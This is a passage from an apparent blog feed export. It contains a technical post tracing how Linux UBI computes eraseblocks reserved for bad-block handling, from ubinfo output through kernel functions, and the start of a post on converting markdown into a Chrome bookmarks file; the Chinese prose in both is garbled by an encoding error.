    printf(&quot;Maximum count of volumes                 %d\n&quot;, dev_info.max_vol_count);
    printf(&quot;Count of bad physical eraseblocks:       %d\n&quot;, dev_info.bad_count);
    printf(&quot;Count of reserved physical eraseblocks:  %d\n&quot;, dev_info.bad_rsvd);
    printf(&quot;Current maximum erase counter value:     %lld\n&quot;, dev_info.max_ec);
    printf(&quot;Minimum input/output unit size:          %d %s\n&quot;,
           dev_info.min_io_size, dev_info.min_io_size &gt; 1 ? &quot;bytes&quot; : &quot;byte&quot;);
    printf(&quot;Character device major/minor:            %d:%d\n&quot;,
           dev_info.major, dev_info.minor);

    if (dev_info.vol_count == 0)
        return 0;

    printf(&quot;Present volumes:                         &quot;);
    for (i = dev_info.lowest_vol_id;
         i &lt;= dev_info.highest_vol_id; i++) {
        err = ubi_get_vol_info1(libubi, dev_info.dev_num, i, &amp;vol_info);
        if (err == -1) {
            if (errno == ENOENT)
                continue;

            return sys_errmsg(&quot;libubi failed to probe volume %d on ubi%d&quot;,
                      i, dev_info.dev_num);
        }

        if (!first)
            printf(&quot;, %d&quot;, i);
        else {
            printf(&quot;%d&quot;, i);
            first = 0;
        }
    }
    printf(&quot;\n&quot;);

    if (!all)
        return 0;

    first = 1;
    printf(&quot;\n&quot;);

    for (i = dev_info.lowest_vol_id;
         i &lt;= dev_info.highest_vol_id; i++) {
        if(!first)
            printf(&quot;-----------------------------------\n&quot;);
        err = ubi_get_vol_info1(libubi, dev_info.dev_num, i, &amp;vol_info);
        if (err == -1) {
            if (errno == ENOENT)
                continue;

            return sys_errmsg(&quot;libubi failed to probe volume %d on ubi%d&quot;,
                      i, dev_info.dev_num);
        }
        first = 0;

        err = print_vol_info(libubi, dev_info.dev_num, i);
        if (err)
            return err;
    }

    return 0;
}
</code></pre>
<p>ref: <a href="http://git.infradead.org/mtd-utils.git/blob/639b871fe3d2cb3e73d21363e8c13ede2bbd9f99:/ubi-utils/ubinfo.c" target="_blank" rel="noopener">http://git.infradead.org/mtd-utils.git/blob/639b871fe3d2cb3e73d21363e8c13ede2bbd9f99:/ubi-utils/ubinfo.c</a></p>
<p>æ‰“å°ä¿ç•™sizeçš„æ˜¯ä¸‹é¢è¿™ä¸€è¡Œï¼Œå¯¹åº”å˜é‡<code>dev_info.bad_rsvd</code></p>
<pre><code class="c">printf(&quot;Count of reserved physical eraseblocks:  %d\n&quot;, dev_info.bad_rsvd);
</code></pre>
<h3 id="è¿½è¸ª-bad-rsvd"><a href="#è¿½è¸ª-bad-rsvd" class="headerlink" title="è¿½è¸ª bad_rsvd"></a>è¿½è¸ª bad_rsvd</h3><p>æ ¹æ® <code>dev_info.bad_rsvd</code> è¿™ä¸ªå˜é‡å¯ä»¥é€æ­¥é€†å‘è¿½æº¯åˆ°ä¿¡æ¯æ¥æº</p>
<p><img src="/assets/linux/get-bad_rsvd.png" alt="print_dev_info å‡½æ•°è°ƒç”¨å…³ç³»"></p>
<p>ä»ä»¥ä¸Šå‡½æ•°è°ƒç”¨å…³ç³»å¯ä»¥çœ‹å‡ºï¼Œé¥¶äº†ä¸€å¤§åœˆï¼Œå®é™…ä¸Šå°±æ˜¯è¯»äº†ä¸ªæ–‡ä»¶é‡Œçš„å€¼ï¼Œæ²¡é”™ï¼Œè¿™ä¸ªå€¼å°±æ˜¯å­˜åœ¨<code>/sys/class/ubi/ubi0/reserved_for_bad</code>æ–‡ä»¶é‡Œ</p>
<pre><code class="sh">root:/sys/devices/virtual/ubi/ubi0# ls
avail_eraseblocks  max_ec             reserved_for_bad   ubi0_2
bad_peb_count      max_vol_count      subsystem          ubi0_3
bgt_enabled        min_io_size        total_eraseblocks  ubi0_4
dev                mtd_num            ubi0_0             uevent
eraseblock_size    power              ubi0_1             volumes_count
root:/sys/devices/virtual/ubi/ubi0# cat reserved_for_bad
20
</code></pre>
<p>åœ¨ç›®å½•<code>/sys/class/ubi/ubi0</code>ä¸‹è¿˜å¯ä»¥çœ‹åˆ°å…¶å®ƒubiä¿¡æ¯ï¼Œæ¯”å¦‚avail_eraseblocksï¼ˆå¯ç”¨å—ï¼‰, bad_peb_countï¼ˆåå—ä¸ªæ•°ï¼‰ç­‰ã€‚</p>
<p>å¥½å•¦ï¼Œç”¨æˆ·ç©ºé—´å°±åˆ°è¿™å§ï¼Œæˆ‘ä»¬å·²ç»ææ¸…æ¥šäº†<code>ubinfo -a</code>çš„ä¿¡æ¯æ¥æºæ˜¯ç³»ç»Ÿç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥å¾ˆå®¹æ˜“çŒœåˆ°è¿™äº›æ–‡ä»¶æ˜¯ç³»ç»Ÿå†…æ ¸äº§ç”Ÿçš„ï¼Œç¡®åˆ‡çš„è¯´æ˜¯UBIé©±åŠ¨ç¨‹åºäº§ç”Ÿçš„ã€‚</p>
<h2 id="å†…æ ¸ç©ºé—´"><a href="#å†…æ ¸ç©ºé—´" class="headerlink" title="å†…æ ¸ç©ºé—´"></a>å†…æ ¸ç©ºé—´</h2><p>æ¥ä¸‹æ¥çœ‹å†…æ ¸ç©ºé—´çš„UBIé©±åŠ¨éƒ¨åˆ†ï¼ŒæŸ¥æ‰¾åº•å±‚é©±åŠ¨æ˜¯å¦‚ä½•è®¡ç®—åå—ä¿ç•™å¤§å°çš„ã€‚</p>
<p>æ ¹æ®å¼€æœºè¿‡ç¨‹çš„UBI logï¼Œåœ¨linuxå†…æ ¸çš„<code>drivers/mtd/ubi/</code>ç›®å½•grepæœç´¢ç›¸å…³å­—ç¬¦ä¸²ï¼ˆå¦‚&quot;PEBs reserved for bad PEB handling&quot;ï¼‰ï¼Œå¯ä»¥æ‰¾åˆ°æ‰“å°è¿™äº›logçš„å‡½æ•°<code>ubi_attach_mtd_dev</code>.</p>
<h3 id="ubi-attach-mtd-dev"><a href="#ubi-attach-mtd-dev" class="headerlink" title="ubi_attach_mtd_dev"></a>ubi_attach_mtd_dev</h3><p>è¯¥å‡½æ•°ç”¨äºé™„åŠ MTD deviceåˆ°UBIå¹¶åˆ†é…@ubi_numç»™æ–°åˆ›å»ºçš„UBIè®¾å¤‡ï¼Œåœ¨é™„åŠ è¿‡ç¨‹ä¸­ä¼šæ‰“å°UBIè®¾å¤‡çš„ç›¸å…³ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯<a href="#UBI-attach">UBI attach</a>éƒ¨åˆ†çš„console log.</p>
<pre><code class="c">int ubi_attach_mtd_dev(struct mtd_info *mtd, int ubi_num,
            int vid_hdr_offset, int max_beb_per1024)
{
  struct ubi_device *ubi;
  int i, err, ref = 0;

  /*çœç•¥éƒ¨åˆ†ä»£ç */

  ubi_msg(&quot;attached mtd%d (name \&quot;%s\&quot;, size %llu MiB) to ubi%d&quot;,
     mtd-&gt;index, mtd-&gt;name, ubi-&gt;flash_size &gt;&gt; 20, ubi_num);
  ubi_msg(&quot;PEB size: %d bytes (%d KiB), LEB size: %d bytes&quot;,
     ubi-&gt;peb_size, ubi-&gt;peb_size &gt;&gt; 10, ubi-&gt;leb_size);
  ubi_msg(&quot;min./max. I/O unit sizes: %d/%d, sub-page size %d&quot;,
     ubi-&gt;min_io_size, ubi-&gt;max_write_size, ubi-&gt;hdrs_min_io_size);
  ubi_msg(&quot;VID header offset: %d (aligned %d), data offset: %d&quot;,
     ubi-&gt;vid_hdr_offset, ubi-&gt;vid_hdr_aloffset, ubi-&gt;leb_start);
  ubi_msg(&quot;good PEBs: %d, bad PEBs: %d, corrupted PEBs: %d&quot;,
     ubi-&gt;good_peb_count, ubi-&gt;bad_peb_count, ubi-&gt;corr_peb_count);
  ubi_msg(&quot;user volume: %d, internal volumes: %d, max. volumes count: %d&quot;,
     ubi-&gt;vol_count - UBI_INT_VOL_COUNT, UBI_INT_VOL_COUNT,
     ubi-&gt;vtbl_slots);
  ubi_msg(&quot;max/mean erase counter: %d/%d, WL threshold: %d, image sequence number: %u&quot;,
     ubi-&gt;max_ec, ubi-&gt;mean_ec, CONFIG_MTD_UBI_WL_THRESHOLD,
     ubi-&gt;image_seq);
  ubi_msg(&quot;available PEBs: %d, total reserved PEBs: %d, PEBs reserved for bad PEB handling: %d&quot;,
     ubi-&gt;avail_pebs, ubi-&gt;rsvd_pebs, ubi-&gt;beb_rsvd_pebs);

  /*çœç•¥éƒ¨åˆ†ä»£ç */
}
</code></pre>
<p>ref: <a href="https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi/build.c#L867" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi/build.c#L867</a></p>
<p>ä»å‡½æ•°å¯ä»¥çœ‹åˆ°æ‰“å°åå—ä¿ç•™åˆ†åŒºçš„è¯­å¥ï¼š</p>
<pre><code class="c">ubi_msg(&quot;available PEBs: %d, total reserved PEBs: %d, PEBs reserved for bad PEB handling: %d&quot;,
   ubi-&gt;avail_pebs, ubi-&gt;rsvd_pebs, ubi-&gt;beb_rsvd_pebs);
</code></pre>
<p>ç»“åˆä»¥ä¸‹å˜é‡å®šä¹‰</p>
<pre><code class="c">/**
 * struct ubi_device - UBI device description structure
 * ...
 * @rsvd_pebs: count of reserved physical eraseblocks
 * @avail_pebs: count of available physical eraseblocks
 * @beb_rsvd_pebs: how many physical eraseblocks are reserved for bad PEB
 *                 handling
 * @beb_rsvd_level: normal level of PEBs reserved for bad PEB handling
 * ...
 */
</code></pre>
<p>ref: <a href="https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi/ubi.h#L383" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi/ubi.h#L383</a></p>
<p>å¯çŸ¥å˜é‡<code>beb_rsvd_pebs</code>å¯¹åº”çš„å°±æ˜¯ä¸ºåå—é¢„ç•™çš„å¤§å°ï¼Œ<code>beb_rsvd_level</code>æ˜¯åå—é¢„ç•™çš„å¸¸è§„ç­‰çº§ï¼Œè¿™ä¸¤è€…æœ‰å•¥è”ç³»å‘¢ã€‚OKï¼Œæ¥ä¸‹æ¥è¦åšçš„å’Œç”¨æˆ·ç©ºé—´ä¸€æ ·ï¼Œæˆ‘ä»¬è¿›è¡Œé€†å‘è¿½è¸ªï¼Œçœ‹ä¸‹è¿™ä¸¤ä¸ªå˜é‡çš„å€¼æ˜¯å¦‚ä½•è·å–çš„ã€‚</p>
<h3 id="è¿½è¸ª-beb-rsvd-pebs"><a href="#è¿½è¸ª-beb-rsvd-pebs" class="headerlink" title="è¿½è¸ª beb_rsvd_pebs"></a>è¿½è¸ª beb_rsvd_pebs</h3><p><img src="/assets/linux/get-beb_rsvd_pebs.png" alt="get beb_rsvd_pebs"></p>
<p>å›¾ä¸­è™šçº¿ä»£è¡¨éç›´æ¥è°ƒç”¨å…³ç³»ï¼Œè™šçº¿ä¸­é—´çš„å…¨å±€å˜é‡ä»£è¡¨çš„æ˜¯ä¸¤ä¸ªèŠ‚ç‚¹çš„å…³è”ä¿¡æ¯ï¼Œæ‹ä¸€ä¸‹ï¼š</p>
<ol>
<li>ubi_eba_init è°ƒç”¨ ubi_calculate_reserved å‡½æ•°è®¡ç®—å‡º <code>beb_rsvd_level</code><ul>
<li>ubi_calculate_reserved è°ƒç”¨äº† get_bad_peb_limit è·å– <code>bad_peb_limit</code></li>
<li>get_bad_peb_limit è°ƒç”¨äº†å…¶å®ƒ3ä¸ªå‡½æ•°è®¡ç®— <code>bad_peb_limit</code></li>
</ul>
</li>
<li>ubi_eba_init å°† <code>beb_rsvd_level</code> èµ‹å€¼ç»™ <code>beb_rsvd_level</code></li>
<li>ubi_attach_mtd_dev å°† <code>beb_rsvd_pebs</code> æ‰“å°åˆ° console</li>
</ol>
<p>æœ‰ç‚¹ç»•ï¼Œæ²¡å…³ç³»ï¼Œä¸‹é¢æŒ‰ç…§ç®­å¤´æ–¹å‘ä»ä¸‹å¾€ä¸Šé€ä¸€ç»†è¯´ã€‚</p>
<h3 id="ubi-eba-init"><a href="#ubi-eba-init" class="headerlink" title="ubi_eba_init"></a>ubi_eba_init</h3><p><code>ubi_eba_init</code> ä½¿ç”¨ubiä¿¡æ¯åˆå§‹åŒ–EBAå­ç³»ç»Ÿï¼Œä½†æ˜¯è¿™ä¸ªæˆ‘ä»¬ä¸å…³å¿ƒï¼Œä¸»è¦çœ‹å…¶ä¸­ä¸€å°æ®µä»£ç ã€‚</p>
<pre><code class="c">int ubi_eba_init(struct ubi_device *ubi, struct ubi_attach_info *ai)
{
   /*çœç•¥éƒ¨åˆ†ä»£ç */

  if (ubi-&gt;bad_allowed) {
    ubi_calculate_reserved(ubi);

    if (ubi-&gt;avail_pebs &lt; ubi-&gt;beb_rsvd_level) {
      /* No enough free physical eraseblocks */
      ubi-&gt;beb_rsvd_pebs = ubi-&gt;avail_pebs;
      print_rsvd_warning(ubi, ai);
    } else
      ubi-&gt;beb_rsvd_pebs = ubi-&gt;beb_rsvd_level;

    ubi-&gt;avail_pebs -= ubi-&gt;beb_rsvd_pebs;
    ubi-&gt;rsvd_pebs  += ubi-&gt;beb_rsvd_pebs;
  }

   /*çœç•¥éƒ¨åˆ†ä»£ç */
}
</code></pre>
<p>åœ¨å…è®¸åå—ï¼Œå¹¶ä¸”æœ‰è¶³å¤ŸPEBsçš„æƒ…å†µä¸‹, <code>beb_rsvd_pebs</code> ç­‰äº <code>beb_rsvd_level</code></p>
<pre><code class="c">ubi-&gt;beb_rsvd_pebs = ubi-&gt;beb_rsvd_level;
</code></pre>
<p>okï¼Œé‚£æ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯<code>beb_rsvd_level</code>å¦‚ä½•å¾—æ¥ï¼Œç»§ç»­å¾€ä¸‹â†“</p>
<h3 id="ubi-calculate-reserved"><a href="#ubi-calculate-reserved" class="headerlink" title="ubi_calculate_reserved"></a>ubi_calculate_reserved</h3><p>ä»ä¸Šé¢çš„æµç¨‹å›¾å¯çŸ¥ï¼Œ<code>beb_rsvd_level</code> ç”± ä»¥ä¸‹å‡½æ•°è®¡ç®—å¾—åˆ°ã€‚</p>
<pre><code class="c">/**
 * ubi_calculate_reserved - calculate how many PEBs must be reserved for bad
 * eraseblock handling.
 * @ubi: UBI device description object
 */
void ubi_calculate_reserved(struct ubi_device *ubi)
{
  /*
   * Calculate the actual number of PEBs currently needed to be reserved
   * for future bad eraseblock handling.
   */
  ubi-&gt;beb_rsvd_level = ubi-&gt;bad_peb_limit - ubi-&gt;bad_peb_count;
  if (ubi-&gt;beb_rsvd_level &lt; 0) {
     ubi-&gt;beb_rsvd_level = 0;
     ubi_warn(&quot;number of bad PEBs (%d) is above the expected limit (%d), not reserving any PEBs for bad PEB handling, will use available PEBs (if any)&quot;,
        ubi-&gt;bad_peb_count, ubi-&gt;bad_peb_limit);
  }
}
</code></pre>
<p>è¿™ä¸ªå‡½æ•°çš„ç²¾é«“å°±ä¸€è¡Œ, <code>beb_rsvd_level</code> ç­‰äºåå—é™åˆ¶ <code>bad_peb_limit</code> å‡å»å½“å‰å·²æ£€æµ‹åˆ°çš„åå—æ•°é‡<code>bad_peb_count</code>.</p>
<pre><code class="c">ubi-&gt;beb_rsvd_level = ubi-&gt;bad_peb_limit - ubi-&gt;bad_peb_count;
</code></pre>
<p>ç”±äºæ£€æµ‹åˆ°çš„åå—æ•°é‡ä¸ç¡¬ä»¶å®é™…æƒ…å†µæœ‰å…³ï¼Œæˆ‘ä»¬ä¸æ·±ç©¶ï¼Œæ¥ä¸‹æ¥ç»§ç»­è¿½æº¯ <code>bad_peb_limit</code> çš„æ¥æºã€‚</p>
<h3 id="get-bad-peb-limit"><a href="#get-bad-peb-limit" class="headerlink" title="get_bad_peb_limit"></a>get_bad_peb_limit</h3><p><code>get_bad_peb_limit</code> å°±æ˜¯ç”¨æ¥è®¡ç®—åå—é™åˆ¶çš„å‡½æ•°ï¼Œå‡½æ•°ä¸­æœ‰æ®µæ³¨é‡Šï¼Œå¤§è‡´æ„æ€æ˜¯æˆ‘ä»¬ä¸èƒ½ä¿è¯åå—å¹³å‡åˆ†æ‘Šåœ¨æ•´ä¸ªflashèŠ¯ç‰‡ï¼Œè€ƒè™‘æœ€åæƒ…å†µï¼Œæœ‰å¯èƒ½æ‰€æœ‰åå—éƒ½å‡ºç°åœ¨é™„åŠ äº†ubiçš„MTDåˆ†åŒºã€‚å› æ­¤åœ¨è®¡ç®—é™åˆ¶å¤§å°æ—¶ä½¿ç”¨çš„æ˜¯æ•´ä¸ªflash size.</p>
<pre><code class="c">static int get_bad_peb_limit(const struct ubi_device *ubi, int max_beb_per1024)
{
  int limit, device_pebs;
  uint64_t device_size;

  if (!max_beb_per1024)
     return 0;

  /*
   * Here we are using size of the entire flash chip and
   * not just the MTD partition size because the maximum
   * number of bad eraseblocks is a percentage of the
   * whole device and bad eraseblocks are not fairly
   * distributed over the flash chip. So the worst case
   * is that all the bad eraseblocks of the chip are in
   * the MTD partition we are attaching (ubi-&gt;mtd).
   */
  device_size = mtd_get_device_size(ubi-&gt;mtd);
  device_pebs = mtd_div_by_eb(device_size, ubi-&gt;mtd);
  limit = mult_frac(device_pebs, max_beb_per1024, 1024);

  /* Round it up */
  if (mult_frac(limit, 1024, max_beb_per1024) &lt; device_pebs)
     limit += 1;

  return limit;
}
</code></pre>
<p>è¿™é‡Œç”¨åˆ°3ä¸ªå‡½æ•°ï¼š</p>
<ol>
<li><code>mtd_get_device_size</code> - è·å–æ•´ä¸ªflashèŠ¯ç‰‡çš„å¤§å°</li>
<li><code>mtd_div_by_eb</code> - å°†flashå¤§å°æ¢ç®—æˆeraseblockä¸ªæ•°ï¼Œå°±æ˜¯å°†Byteså•ä½æ¢ç®—ä¸ºPEBs</li>
<li><code>mult_frac</code> - åˆ†æ•°ç›¸ä¹˜å‡½æ•°ï¼ŒæŠŠä»¥PEBä¸ºå•ä½çš„limitå€¼ä¹˜ä»¥ä¸€ä¸ªåå—ç³»æ•°</li>
</ol>
<p>å‰é¢ä¸¤ä¸ªå‡½æ•°éƒ½å¥½ç†è§£ï¼Œå•ç‹¬æ¥çœ‹ä¸‹<code>mult_frac</code>, è¿™å…¶å®æ˜¯ä¸ªå®å®šä¹‰ï¼Œç”¨äºåˆ†æ•°ç›¸ä¹˜ã€‚</p>
<pre><code class="c">/*
 * Multiplies an integer by a fraction, while avoiding unnecessary
 * overflow or loss of precision.
 */
#define mult_frac(x, numer, denom)( \
{ \
  typeof(x) quot = (x) / (denom); \
  typeof(x) rem  = (x) % (denom); \
  (quot * (numer)) + ((rem * (numer)) / (denom)); \
} \
)
</code></pre>
<p>ä¸¾ä¾‹è¯´æ˜ï¼Œå‡è®¾flashä¸º128MB(134,217,728 Bytes), <code>get_bad_peb_limit</code>å‡½æ•°ç”¨åˆ°çš„<code>max_beb_per1024</code>æ¥è‡ªäºkernel config, é»˜è®¤å€¼ä¸º20ï¼Œä»£è¡¨æ¯1024 PEBsä¸­æœ€å¤šå…è®¸20ä¸ªåå—ï¼Œé‚£ä¹ˆå¯¹åº”çš„limitè®¡ç®—å¦‚ä¸‹ï¼š</p>
<pre><code class="c">device_size = 134217728; /* flash size 128MB */
device_pebs = 134217728 / (128 * 1024) = 1024; /* eraseblock: 128KB */
limit = mult_frac(device_pebs, max_beb_per1024, 1024) = 1024 * (20 / 1024) = 20;
</code></pre>
<p>æœ€ç»ˆè®¡ç®—å¾—åˆ°<code>bad_peb_limit</code>ä¸º20 PEBs, ä¸ <a href="#ubinfo-a">ubinfo -a</a> ä¸­çš„ç»“æœä¸€è‡´ã€‚</p>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬æ–‡é¦–å…ˆä» console log å…¥æ‰‹åˆ†æäº†UBIç›¸å…³é…ç½®ä¿¡æ¯ï¼Œç„¶åä»ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´ä¸¤ä¸ªæ–¹é¢åˆ†æäº†UBIä¿¡æ¯çš„æ¥æºä»¥åŠåå—ä¿ç•™å¤§å°çš„è®¡ç®—. å…¶ä¸­åå—ä¿ç•™å¤§å° <code>beb_rsvd_pebs</code> çš„è®¡ç®—è¿‡ç¨‹å¯ä»¥å½’ç»“ä¸ºï¼š</p>
<pre><code class="c">/* get_bad_peb_limit */
device_size = mtd_get_device_size(ubi-&gt;mtd);
device_pebs = mtd_div_by_eb(device_size, ubi-&gt;mtd);
limit = mult_frac(device_pebs, max_beb_per1024, 1024);

ubi-&gt;bad_peb_limit = get_bad_peb_limit(ubi, max_beb_per1024);

/* ubi_calculate_reserved */
ubi-&gt;beb_rsvd_level = ubi-&gt;bad_peb_limit - ubi-&gt;bad_peb_count;

/* ubi_eba_init */
ubi-&gt;beb_rsvd_pebs = ubi-&gt;beb_rsvd_level;
</code></pre>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi</a></li>
<li><a href="http://git.infradead.org/mtd-utils.git" target="_blank" rel="noopener">http://git.infradead.org/mtd-utils.git</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> ubi </tag>
            
            <tag> flash </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pythonä¹‹markdownè½¬Chromeæ”¶è—å¤¹]]></title>
      <url>https://www.litreily.top/2020/05/03/md2bm/</url>
      <content type="html"><![CDATA[<p>ç½‘ä¸Šå¯ä»¥æœåˆ°å¾ˆå¤šchromeæ”¶è—å¤¹è½¬markdownæ–‡æ¡£çš„æ–¹æ³•ï¼Œå´é²œæœ‰markdownæ–‡æ¡£è½¬ä¸ºChromeæ”¶è—å¤¹çš„æ–¹æ³•ï¼Œä¸è¿‡è¿™ç§éœ€æ±‚ä¹Ÿç¡®å®ä¸å¤šã€‚æˆ‘ä¹‹æ‰€ä»¥ç”¨åˆ°ï¼Œæ˜¯å› ä¸ºå¹³å¸¸ä¼šç”¨markdownæ–‡æ¡£æ”¶é›†ä¸€äº›ç½‘ç«™ï¼Œç°åœ¨æƒ³è¦è½¬æ¢ä¸ºChromeæ”¶è—å¤¹ï¼Œæ–¹ä¾¿è®¿é—®ã€‚</p>
<h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>è¦å®ç°è¿™ä¸ªåŠŸèƒ½å€’ä¹Ÿä¸éš¾ï¼Œå› ä¸ºChromeçš„æ”¶è—å¤¹æœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªhtmlæ–‡ä»¶ï¼Œåªä¸è¿‡æœ‰å…¶å›ºå®šçš„DOMç»“æ„è€Œå·²ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å®ç°æ€è·¯å¾ˆç®€å•ã€‚</p>
<ol>
<li>å¯¼å‡ºChromeå·²æœ‰çš„æ”¶è—å¤¹</li>
<li>åˆ†æå¯¼å‡ºå¾—åˆ°çš„htmlæ–‡ä»¶æ ¼å¼</li>
<li>å°†è‡ªå·±éœ€è¦è½¬æˆChromeæ”¶è—å¤¹çš„markdownæŒ‰ç›¸åŒæ ¼å¼è½¬æ¢ä¸ºhtmlæ–‡ä»¶</li>
<li>åœ¨chromeä¸­å¯¼å…¥ç”Ÿæˆåçš„æ”¶è—å¤¹</li>
</ol>
<h2 id="æ”¶è—å¤¹çš„DOMç»“æ„"><a href="#æ”¶è—å¤¹çš„DOMç»“æ„" class="headerlink" title="æ”¶è—å¤¹çš„DOMç»“æ„"></a>æ”¶è—å¤¹çš„DOMç»“æ„</h2><p>æˆ‘å¯¼å‡ºäº†è‡ªå·±çš„æ”¶è—å¤¹ï¼Œå–å‡ºå…¶ä¸­ä¸€å°éƒ¨åˆ†ä¸ºä¾‹è¿›è¡Œåˆ†æï¼Œæ¯”è¾ƒå±€éƒ¨æ˜¯å¯ä»¥åæ˜ æ•´ä½“çš„ã€‚</p>
<pre><code class="html">&lt;!DOCTYPE NETSCAPE-Bookmark-file-1&gt;
&lt;!-- This is an automatically generated file.
     It will be read and overwritten.
     DO NOT EDIT! --&gt;
&lt;META HTTP-EQUIV=&quot;Content-Type&quot; CONTENT=&quot;text/html; charset=UTF-8&quot;&gt;
&lt;TITLE&gt;Bookmarks&lt;/TITLE&gt;
&lt;H1&gt;Bookmarks&lt;/H1&gt;
&lt;DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1499940499&quot; LAST_MODIFIED=&quot;1573567059&quot; PERSONAL_TOOLBAR_FOLDER=&quot;true&quot;&gt;Bookmarks bar&lt;/H3&gt;
    &lt;DL&gt;&lt;p&gt;
        &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1481956366&quot; LAST_MODIFIED=&quot;1565750292&quot;&gt;ä¸å¸¸ç”¨&lt;/H3&gt;
        &lt;DL&gt;&lt;p&gt;
            &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1460906121&quot; LAST_MODIFIED=&quot;1582357904&quot;&gt;è®¾è®¡&lt;/H3&gt;
            &lt;DL&gt;&lt;p&gt;
                &lt;DT&gt;&lt;A HREF=&quot;https://w3layouts.com/&quot; ADD_DATE=&quot;1460906098&quot; ICON=&quot;data:image/png;base64,&quot;&gt;Free Responsive Mobile Website Templates Designs - w3layouts.com&lt;/A&gt;
                &lt;DT&gt;&lt;A HREF=&quot;http://www.hightopo.com/demos/index.html&quot; ADD_DATE=&quot;1472525305&quot; ICON=&quot;data:image/png;base64,&quot;&gt;Hightopo - Everything you need to create cutting-edge 2D and 3D visualization&lt;/A&gt;
                &lt;DT&gt;&lt;A HREF=&quot;http://jekyllthemes.org/&quot; ADD_DATE=&quot;1459860502&quot;&gt;Jekyll Themes&lt;/A&gt;
            &lt;/DL&gt;&lt;p&gt;
            &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1468076322&quot; LAST_MODIFIED=&quot;1538094516&quot;&gt;ç®—æ³•&lt;/H3&gt;
            &lt;DL&gt;&lt;p&gt;
                &lt;DT&gt;&lt;A HREF=&quot;http://www.pythontip.com/acm/problemCategory&quot; ADD_DATE=&quot;1468076332&quot; ICON=&quot;data:image/png;base64,&quot;&gt;å„å¤§OJé¢˜ç›®åˆ†ç±»&lt;/A&gt;
                &lt;DT&gt;&lt;A HREF=&quot;http://www.acmerblog.com/&quot; ADD_DATE=&quot;1468075312&quot; ICON=&quot;data:image/png;base64,&quot;&gt;Acmä¹‹å®¶&lt;/A&gt;
            &lt;/DL&gt;&lt;p&gt;
            &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1550926992&quot; LAST_MODIFIED=&quot;1582961771&quot;&gt;å›¾æ ‡&lt;/H3&gt;
            &lt;DL&gt;&lt;p&gt;
                &lt;DT&gt;&lt;A HREF=&quot;https://www.emojicopy.com/&quot; ADD_DATE=&quot;1550926923&quot; ICON=&quot;data:image/png;base64,&quot;&gt;EmojiCopy | Simple emoji copy and paste by EmojiOneâ„¢&lt;/A&gt;
                &lt;DT&gt;&lt;A HREF=&quot;https://www.webfx.com/tools/emoji-cheat-sheet/&quot; ADD_DATE=&quot;1582961771&quot; ICON=&quot;data:image/png;base64,&quot;&gt;ğŸ Emoji cheat sheet for GitHub, Basecamp, Slack &amp;amp; more&lt;/A&gt;
            &lt;/DL&gt;&lt;p&gt;
            &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1412991964&quot; LAST_MODIFIED=&quot;1586250269&quot;&gt;è®ºå›&lt;/H3&gt;
            &lt;DL&gt;&lt;p&gt;
                &lt;DT&gt;&lt;A HREF=&quot;https://www.qt.io/&quot; ADD_DATE=&quot;1472370392&quot; ICON=&quot;data:image/png;base64,&quot;&gt;Qt&lt;/A&gt;
                &lt;DT&gt;&lt;A HREF=&quot;https://freessl.cn/&quot; ADD_DATE=&quot;1566824588&quot; ICON=&quot;data:image/png;base64,&quot;&gt;FreeSSLé¦–é¡µ - FreeSSL.cn ä¸€ä¸ªç”³è¯·å…è´¹HTTPSè¯ä¹¦çš„ç½‘ç«™&lt;/A&gt;
            &lt;/DL&gt;&lt;p&gt;
        &lt;/DL&gt;&lt;p&gt;
        &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1538059196&quot; LAST_MODIFIED=&quot;1569229251&quot;&gt;wiki&lt;/H3&gt;
        &lt;DL&gt;&lt;p&gt;
            &lt;DT&gt;&lt;A HREF=&quot;https://code.woboq.org/linux/linux/&quot; ADD_DATE=&quot;1528874869&quot; ICON=&quot;data:image/png;base64,&quot;&gt;linux/linux/ Source Tree - Woboq Code Browser&lt;/A&gt;
            &lt;DT&gt;&lt;A HREF=&quot;https://www.geeksforgeeks.org/c-programming-language/&quot; ADD_DATE=&quot;1569229251&quot;&gt;C Programming Language - GeeksforGeeks&lt;/A&gt;
        &lt;/DL&gt;&lt;p&gt;
        &lt;DT&gt;&lt;A HREF=&quot;http://translate.google.cn/&quot; ADD_DATE=&quot;1446427265&quot; ICON=&quot;data:image/png;base64,&quot;&gt;&lt;/A&gt;
        &lt;DT&gt;&lt;A HREF=&quot;http://www.litreily.top/&quot; ADD_DATE=&quot;1481438786&quot; ICON=&quot;data:image/png;base64,&quot;&gt;&lt;/A&gt;
    &lt;/DL&gt;&lt;p&gt;
&lt;/DL&gt;&lt;p&gt;
</code></pre>
